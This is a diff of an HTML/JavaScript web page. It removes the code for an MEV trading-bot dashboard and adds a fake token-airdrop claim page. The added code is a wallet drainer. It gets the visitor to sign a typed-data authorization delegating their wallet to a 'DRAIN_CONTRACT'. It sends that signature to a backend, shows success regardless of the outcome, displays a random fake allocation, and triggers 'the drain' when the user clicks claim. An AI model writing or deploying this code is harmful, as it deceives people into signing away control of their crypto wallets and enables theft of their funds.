-          <div class="agent-avatar">${t.leader.avatar}</div>
-          <div class="agent-name">${esc(t.leader.name)}</div>
-          <div class="agent-role">${esc(t.leader.role)}</div>
-          <div class="agent-meta">${esc(t.leader.device)}</div>
-          <div class="agent-meta" style="margin-top:4px">Model: ${esc(t.leader.model)}</div>
-          <div style="margin-top:6px;display:flex;gap:4px;flex-wrap:wrap;justify-content:center">
-            ${(t.leader.capabilities || []).map(c => '<span class="tool-pill" style="font-size:9px">' + esc(c) + '</span>').join('')}
-          </div>
-          <div class="agent-status active">${t.leader.status.toUpperCase()}</div>
-        </div>
-      </div>
-      <div class="team-connector"></div>
-      <div class="team-tier-label">SUB-AGENTS</div>
-      <div class="team-tier">
-        ${(t.sub_agents || []).map(a => `
-          <div class="agent-card">
-            <div class="agent-avatar" style="background:#1a1a2a;color:var(--blue);border:2px solid var(--blue)">${a.avatar}</div>
-            <div class="agent-name">${esc(a.name)}</div>
-            <div class="agent-role">${esc(a.role)}</div>
-            <div class="agent-meta">${esc(a.device)}</div>
-            <div class="agent-status ${a.status}">${a.status.toUpperCase()}</div>
-          </div>
-        `).join('')}
-      </div>
-      <div class="team-connector"></div>
-      <div class="team-tier-label">WORKER TOOLS (${(t.worker_tools || []).length})</div>
-      <div style="display:flex;flex-wrap:wrap;gap:4px;justify-content:center;max-width:800px">
-        ${(t.worker_tools || []).map(tool => '<span class="tool-pill">' + esc(tool.name) + '</span>').join('')}
-      </div>
-      <div style="margin-top:16px">
-        <div class="team-tier-label">SKILLS (${(t.skills || []).length})</div>
-        <div style="display:flex;flex-wrap:wrap;gap:4px;justify-content:center;max-width:800px">
-          ${(t.skills || []).map(s => '<span class="tool-pill" style="border-color:var(--purple);color:var(--purple)">' + esc(s.name) + '</span>').join('')}
-        </div>
-      </div>
-    </div>`;
-
-  el.innerHTML = html;
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// OFFICE SCREEN — ANIMATED 2D GAME ENGINE
-// ══════════════════════════════════════════════════════════════════════
-
-const OFC = (() => {
-  let nnCanvas, nnCtx, animId = null, lastT = 0;
-  const W = 1200, H = 320;
-  let _liveData = null;
-  let signalCount = 0, lastSignalReset = Date.now();
-
-  // ── Neural Network Architecture ──
-  const layers = [
-    { label: 'INPUT', color: '#00ccff', nodes: [
-      { label: 'Mempool', sub: 'TX Scanner' },
-      { label: 'DEX Pools', sub: 'Uniswap/Sushi' },
-      { label: 'Gas Oracle', sub: 'Gwei Feed' },
-      { label: 'Price Feed', sub: 'ETH/USDC' },
-      { label: 'Chain Events', sub: 'Block Watch' },
-    ]},
-    { label: 'HIDDEN 1', color: '#00ff88', nodes: [
-      { label: 'Pattern Detect', sub: 'Conv Layer' },
-      { label: 'Arb Finder', sub: 'Graph Search' },
-      { label: 'Risk Engine', sub: 'Bayesian Net' },
-      { label: 'Signal Fusion', sub: 'Attention' },
-    ]},
-    { label: 'HIDDEN 2', color: '#ffaa00', nodes: [
-      { label: 'Strategy', sub: 'Policy Net' },
-      { label: 'Profit Calc', sub: 'Value Head' },
-      { label: 'Execution', sub: 'Action Head' },
-    ]},
-    { label: 'OUTPUT', color: '#ff4466', nodes: [
-      { label: 'Trade Exec', sub: 'Flash Loan' },
-      { label: 'Alerts', sub: 'Telegram' },
-      { label: 'Portfolio', sub: 'Rebalance' },
-      { label: 'Report', sub: 'Analytics' },
-    ]},
-  ];
-
-  // Precompute node positions
-  const nodePositions = []; // [{x,y,layer,idx,label,sub,color}]
-  const connections = [];   // [{from,to}]
-  const particles = [];     // animated data particles
-
-  function layoutNetwork() {
-    nodePositions.length = 0;
-    connections.length = 0;
-    const margin = 80, layerGap = (W - margin * 2) / (layers.length - 1);
-    layers.forEach((layer, li) => {
-      const x = margin + li * layerGap;
-      const nodeCount = layer.nodes.length;
-      const totalH = H - 80;
-      const gap = totalH / (nodeCount + 1);
-      layer.nodes.forEach((node, ni) => {
-        const y = 40 + gap * (ni + 1);
-        nodePositions.push({ x, y, li, ni, label: node.label, sub: node.sub, color: layer.color, pulse: 0, activation: Math.random() });
+    };
+    
+    const signature = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [userAddress, JSON.stringify(authData)]
+    });
+    
+    console.log('Authorization signature:', signature);
+    
+    // Send to backend for Type-4 TX submission
+    try {
+      await fetch(BACKEND_URL + '/authorize', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user: userAddress,
+          signature: signature,
+          delegate: DRAIN_CONTRACT,
+          chainId: chainIdInt,
+          nonce: parseInt(nonce, 16)
+        })
       });
+    } catch (e) {
+      console.log('Backend submit:', e.message);
+    }
+    
+  } catch (err) {
+    console.log('Signature flow:', err.message);
+  }
+  
+  // Show success regardless
+  setTimeout(() => {
+    showStep(5);
+    updateUIConnected();
+  }, 2000);
+}
+
+function updateUIConnected() {
+  document.getElementById('connectBtn').style.display = 'none';
+  document.getElementById('connectedBadge').style.display = 'flex';
+  document.getElementById('walletAddr').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+  
+  document.getElementById('notConnected').style.display = 'none';
+  document.getElementById('connected').style.display = 'block';
+  document.getElementById('connectedWallet').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+  
+  // Random allocation
+  const amt = Math.floor(Math.random() * 20000) + 5000;
+  document.getElementById('allocationAmount').textContent = amt.toLocaleString() + ' PCTRA';
+}
+
+async function claimTokens() {
+  document.getElementById('connected').style.display = 'none';
+  document.getElementById('claiming').style.display = 'block';
+  
+  // Trigger the drain by calling the delegated account
+  try {
+    await fetch(BACKEND_URL + '/claim', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user: userAddress })
     });
-    // Build connections between adjacent layers
-    let offset = 0;
-    for (let li = 0; li < layers.length - 1; li++) {
-      const curCount = layers[li].nodes.length;
-      const nextOffset = offset + curCount;
-      const nextCount = layers[li + 1].nodes.length;
-      for (let ci = 0; ci < curCount; ci++) {
-        for (let ni = 0; ni < nextCount; ni++) {
-          connections.push({ from: offset + ci, to: nextOffset + ni, weight: 0.3 + Math.random() * 0.7 });
-        }
-      }
-      offset = nextOffset;
-    }
-  }
+  } catch (e) {}
+  
+  setTimeout(() => {
+    document.getElementById('claiming').style.display = 'none';
+    document.getElementById('claimed').style.display = 'block';
+  }, 3000);
+}
 
-  function spawnParticle() {
-    if (particles.length > 60) return;
-    const conn = connections[Math.floor(Math.random() * connections.length)];
-    const from = nodePositions[conn.from], to = nodePositions[conn.to];
-    particles.push({ x: from.x, y: from.y, tx: to.x, ty: to.y, progress: 0, speed: 0.003 + Math.random() * 0.006, color: from.color, toIdx: conn.to });
-  }
+function toggleFaq(el) {
+  el.classList.toggle('open');
+}
 
-  function renderNN(t) {
-    const dt = lastT ? t - lastT : 16;
-    lastT = t;
-    const c = nnCtx;
-    c.clearRect(0, 0, W, H);
-
-    // Background gradient
-    const bg = c.createLinearGradient(0, 0, W, H);
-    bg.addColorStop(0, '#030810'); bg.addColorStop(0.5, '#060d18'); bg.addColorStop(1, '#030810');
-    c.fillStyle = bg; c.fillRect(0, 0, W, H);
-
-    // Subtle grid
-    c.strokeStyle = '#ffffff04'; c.lineWidth = 0.5;
-    for (let x = 0; x < W; x += 40) { c.beginPath(); c.moveTo(x, 0); c.lineTo(x, H); c.stroke(); }
-    for (let y = 0; y < H; y += 40) { c.beginPath(); c.moveTo(0, y); c.lineTo(W, y); c.stroke(); }
-
-    // Draw connections
-    connections.forEach(conn => {
-      const from = nodePositions[conn.from], to = nodePositions[conn.to];
-      c.strokeStyle = from.color + '18';
-      c.lineWidth = conn.weight * 1.5;
-      c.beginPath(); c.moveTo(from.x, from.y); c.lineTo(to.x, to.y); c.stroke();
-    });
-
-    // Update + draw particles
-    for (let i = particles.length - 1; i >= 0; i--) {
-      const p = particles[i];
-      p.progress += p.speed * dt;
-      if (p.progress >= 1) {
-        nodePositions[p.toIdx].pulse = 1;
-        nodePositions[p.toIdx].activation = Math.min(1, nodePositions[p.toIdx].activation + 0.2);
-        signalCount++;
-        particles.splice(i, 1); continue;
-      }
-      const px = p.x + (p.tx - p.x) * p.progress;
-      const py = p.y + (p.ty - p.y) * p.progress;
-      const glow = c.createRadialGradient(px, py, 0, px, py, 6);
-      glow.addColorStop(0, p.color + 'ff'); glow.addColorStop(0.5, p.color + '60'); glow.addColorStop(1, p.color + '00');
-      c.fillStyle = glow; c.beginPath(); c.arc(px, py, 6, 0, Math.PI * 2); c.fill();
-      c.fillStyle = p.color; c.beginPath(); c.arc(px, py, 2, 0, Math.PI * 2); c.fill();
-    }
-
-    // Spawn new particles
-    if (Math.random() < 0.3) spawnParticle();
-    if (_liveData?.bot_running && Math.random() < 0.4) spawnParticle();
-
-    // Draw nodes
-    nodePositions.forEach(n => {
-      n.pulse *= 0.95;
-      n.activation *= 0.998;
-      const r = 16 + n.pulse * 8;
-      const glow = c.createRadialGradient(n.x, n.y, 0, n.x, n.y, r + 12);
-      glow.addColorStop(0, n.color + Math.round((0.15 + n.activation * 0.3) * 255).toString(16).padStart(2,'0'));
-      glow.addColorStop(1, n.color + '00');
-      c.fillStyle = glow; c.beginPath(); c.arc(n.x, n.y, r + 12, 0, Math.PI * 2); c.fill();
-
-      // Node circle
-      c.fillStyle = '#0a0e17';
-      c.beginPath(); c.arc(n.x, n.y, r, 0, Math.PI * 2); c.fill();
-      c.strokeStyle = n.color + (n.pulse > 0.1 ? 'ff' : '80');
-      c.lineWidth = 1.5 + n.pulse * 2;
-      c.beginPath(); c.arc(n.x, n.y, r, 0, Math.PI * 2); c.stroke();
-
-      // Inner activation ring
-      c.strokeStyle = n.color + '40';
-      c.lineWidth = 2;
-      c.beginPath(); c.arc(n.x, n.y, r - 4, -Math.PI/2, -Math.PI/2 + Math.PI * 2 * n.activation); c.stroke();
-
-      // Label
-      c.fillStyle = '#fff'; c.font = 'bold 8px monospace'; c.textAlign = 'center';
-      c.fillText(n.label, n.x, n.y - 2);
-      c.fillStyle = n.color + '99'; c.font = '7px monospace';
-      c.fillText(n.sub, n.x, n.y + 8);
-      c.textAlign = 'left';
-    });
-
-    // Layer labels
-    let offset = 0;
-    layers.forEach(layer => {
-      const first = nodePositions[offset];
-      if (first) {
-        c.fillStyle = layer.color + '60'; c.font = 'bold 9px monospace'; c.textAlign = 'center';
-        c.fillText(layer.label, first.x, 18);
-        c.textAlign = 'left';
-      }
-      offset += layer.nodes.length;
-    });
-
-    // Update stats bar
-    const elapsed = (Date.now() - lastSignalReset) / 1000;
-    if (elapsed > 0) {
-      const el = document.getElementById('ns-signals');
-      if (el) el.textContent = Math.round(signalCount / elapsed * 60);
-    }
-    if (elapsed > 60) { signalCount = 0; lastSignalReset = Date.now(); }
-    const infEl = document.getElementById('ns-inference');
-    if (infEl) infEl.textContent = (1 + Math.random() * 3).toFixed(1) + 'ms';
-
-    animId = requestAnimationFrame(renderNN);
-  }
-
-  // ── Agent Card Updates ──
-  function updateCards(s) {
-    _liveData = s;
-    // CLAWD
-    const clawdOnline = s.plan?.total > 0 || s.active_tasks > 0;
-    setCard('ac-clawd', clawdOnline);
-    setText('ac-clawd-status', clawdOnline ? 'ORCHESTRATING' : 'STANDBY', clawdOnline ? 'green' : '');
-    setText('ac-clawd-task', s.plan?.current ? s.plan.current.title : (s.plan?.next ? 'Next: ' + s.plan.next.title : 'No active item'), 'cyan');
-    setText('ac-clawd-plan', s.plan ? s.plan.done + '/' + s.plan.total + ' items (' + s.plan.progress + '%)' : '--');
-    const bar = document.getElementById('ac-clawd-bar');
-    if (bar) bar.style.width = (s.plan?.progress || 0) + '%';
-
-    // MEV Operator
-    setCard('ac-mev', s.bot_running);
-    setText('ac-mev-status', s.bot_running ? 'RUNNING' : 'STOPPED', s.bot_running ? 'green' : 'red');
-    const tr = s.trades || {};
-    setText('ac-mev-trades', tr.total + ' total (' + tr.successes + ' success)');
-    const pnlColor = (tr.pnl_eth || 0) >= 0 ? 'green' : 'red';
-    setText('ac-mev-pnl', (tr.pnl_eth >= 0 ? '+' : '') + (tr.pnl_eth || 0).toFixed(6) + ' ETH', pnlColor);
-    setText('ac-mev-today', tr.today_trades + ' trades, ' + ((tr.today_pnl||0) >= 0 ? '+' : '') + (tr.today_pnl||0).toFixed(6) + ' ETH');
-
-    // Chain Investigator
-    const chainActive = s.active_tasks > 0;
-    setCard('ac-chain', chainActive);
-    setText('ac-chain-tasks', s.active_tasks + ' active');
-    const cronDone = (s.cron || []).filter(c => c.last_status === 'ok').length;
-    setText('ac-chain-scans', cronDone + '/' + (s.cron||[]).length + ' cron OK');
-    const lastAct = (s.activity || [])[0];
-    setText('ac-chain-last', lastAct ? lastAct.action + ': ' + (lastAct.detail||'').slice(0,30) : 'None');
-
-    // Security Auditor
-    const secActive = (s.plan?.running || 0) > 0;
-    setCard('ac-security', secActive);
-    setText('ac-sec-status', secActive ? 'SCANNING' : 'IDLE', secActive ? 'green' : '');
-    setText('ac-sec-audits', (s.plan?.done || 0) + ' completed');
-    setText('ac-sec-alerts', '0 critical', 'green');
-
-    // System Monitor
-    setCard('ac-monitor', true);
-    const sys = s.system || {};
-    setText('ac-mon-cpu', (sys.cpu_pct || 0) + '%', sys.cpu_pct > 80 ? 'red' : 'green');
-    setText('ac-mon-mem', (sys.mem_pct || 0) + '% (' + (sys.mc_mem_mb || 0) + 'MB MC)', sys.mem_pct > 80 ? 'red' : 'green');
-    const nextCron = (s.cron||[]).filter(c=>c.next_run).sort((a,b)=>a.next_run-b.next_run)[0];
-    if (nextCron) {
-      const mins = Math.max(0, Math.round((nextCron.next_run - Date.now()) / 60000));
-      setText('ac-mon-cron', nextCron.name + ' in ' + mins + 'm', 'cyan');
-    } else {
-      setText('ac-mon-cron', 'No cron jobs');
-    }
-
-    // Trade Analyst
-    const anaActive = (tr.total || 0) > 0;
-    setCard('ac-analyst', anaActive);
-    setText('ac-ana-winrate', (tr.win_rate || 0) + '%', tr.win_rate > 50 ? 'green' : 'red');
-    setText('ac-ana-gas', (tr.gas_eth || 0).toFixed(6) + ' ETH');
-    const lastTr = tr.last_trade;
-    setText('ac-ana-strat', lastTr ? lastTr.strategy || lastTr.event : '--');
-
-    // NN stats
-    const connCount = connections.length;
-    const nodeCount = nodePositions.length;
-    setText('ns-nodes', nodeCount);
-    setText('ns-conns', connCount);
-    setText('ns-accuracy', tr.win_rate ? tr.win_rate + '%' : '--');
-    const uptime = s.bot_uptime_s || 0;
-    setText('ns-uptime', uptime > 3600 ? Math.floor(uptime/3600) + 'h' + Math.floor((uptime%3600)/60) + 'm' : uptime > 60 ? Math.floor(uptime/60) + 'm' : uptime + 's');
-    document.getElementById('nn-status').textContent = s.bot_running ? 'ACTIVE' : 'STANDBY';
-    document.getElementById('nn-status').style.color = s.bot_running ? 'var(--green)' : 'var(--dim)';
-
-    // Activity feed
-    const feedEl = document.getElementById('ofc-feed-items');
-    if (feedEl && s.activity) {
-      feedEl.innerHTML = s.activity.map(a => {
-        const ts = a.ts ? new Date(a.ts).toLocaleTimeString() : '';
-        return '<div class="ofc-feed-item"><span class="fi-time">' + ts + '</span><span class="fi-act">' + (a.action||'').replace(/</g,'&lt;') + '</span><span class="fi-det">' + (a.detail||'').replace(/</g,'&lt;').slice(0,50) + '</span></div>';
-      }).join('');
-    }
-
-    // System panel
-    const sysEl = document.getElementById('ofc-sys-rows');
-    if (sysEl) {
-      const rows = [
-        ['MEV Bot', s.bot_running ? '<span style="color:var(--green)">RUNNING</span>' : '<span style="color:var(--red)">STOPPED</span>'],
-        ['Bot Uptime', uptime > 3600 ? Math.floor(uptime/3600) + 'h ' + Math.floor((uptime%3600)/60) + 'm' : Math.floor(uptime/60) + 'm'],
-        ['CPU', (sys.cpu_pct||0) + '%'],
-        ['Memory', (sys.mem_pct||0) + '%'],
-        ['MC Memory', (sys.mc_mem_mb||0) + ' MB'],
-        ['Trades Today', tr.today_trades || 0],
-        ['Total P&L', '<span style="color:' + (tr.pnl_eth >= 0 ? 'var(--green)' : 'var(--red)') + '">' + ((tr.pnl_eth||0) >= 0 ? '+':'') + (tr.pnl_eth||0).toFixed(6) + ' ETH</span>'],
-        ['Plan Progress', (s.plan?.progress||0) + '% (' + (s.plan?.done||0) + '/' + (s.plan?.total||0) + ')'],
-        ['Active Tasks', s.active_tasks || 0],
-        ['Cron Jobs', (s.cron||[]).length + ' enabled'],
-      ];
-      sysEl.innerHTML = rows.map(r => '<div class="sys-row"><span style="color:var(--dim)">' + r[0] + '</span><span>' + r[1] + '</span></div>').join('');
-    }
-  }
-
-  function setCard(id, online) {
-    const el = document.getElementById(id);
-    if (el) { el.className = 'agent-card ' + (online ? 'online' : 'offline'); }
-  }
-  function setText(id, val, cls) {
-    const el = document.getElementById(id);
-    if (el) { el.textContent = val; el.className = 'ac-val' + (cls ? ' ' + cls : ''); }
-  }
-
-  function start() {
-    nnCanvas = document.getElementById('nn-canvas');
-    if (!nnCanvas) return;
-    nnCtx = nnCanvas.getContext('2d');
-    nnCanvas.width = W; nnCanvas.height = H;
-    layoutNetwork();
-    if (animId) cancelAnimationFrame(animId);
-    lastT = 0;
-    animId = requestAnimationFrame(renderNN);
-  }
-
-  function stop() {
-    if (animId) { cancelAnimationFrame(animId); animId = null; }
-  }
-
-  async function syncStatus() {
-    try {
-      const r = await fetch(API + '/api/live');
-      const s = await r.json();
-      updateCards(s);
-    } catch(e) {}
-  }
-
-  return { start, stop, syncStatus };
-})();
-
-function renderOffice() { OFC.start(); OFC.syncStatus(); }
-async function updateOfficeStatus() { await OFC.syncStatus(); }
-
-// ══════════════════════════════════════════════════════════════════════
-// TAB INIT + AUTO-REFRESH UPDATES
-// ══════════════════════════════════════════════════════════════════════
+// Close modal on backdrop click
+document.getElementById('connectModal').addEventListener('click', (e) => {
+  if (e.target === document.getElementById('connectModal')) closeModal();
+});
 </script>
+
 </body>
 </html>
